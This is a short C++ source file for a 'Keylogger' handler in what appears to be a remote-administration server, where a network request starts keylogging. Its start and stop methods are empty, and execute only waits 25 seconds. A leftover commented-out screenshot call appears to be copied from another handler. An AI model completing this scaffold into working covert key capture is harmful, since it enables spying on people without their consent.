
#include "keyboard_logger.hpp"

namespace http
{
	namespace server
	{

		Keylogger::Keylogger(ip::tcp::socket& sock, io_service& io_ref) :
			TaskHandlerInterface(sock, io_ref)
		{
			operations_queue_ptr = async_op::new_();
		}

		void Keylogger::start()
		{

		}

		void Keylogger::stop()
		{

		}

		bool Keylogger::execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep)
		{
			if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_START))
			{
				return false;
			}

            start();

			boost::asio::deadline_timer timer(io_ref_);
			timer.expires_from_now(boost::posix_time::seconds(25));
			timer.wait();
			stop();
			std::shared_ptr<std::vector<char>> buffer_ptr = std::make_shared<std::vector<char>>();
			//operations_queue_ptr->add(
			//	boost::bind(&Keylogger::take_screenshot, this, buffer_ptr, 100),
			//	boost::bind(&Keylogger::on_take_screenshot, this, req, rep, buffer_ptr, _1), io_ref_);

			return true;
		}
	}
}
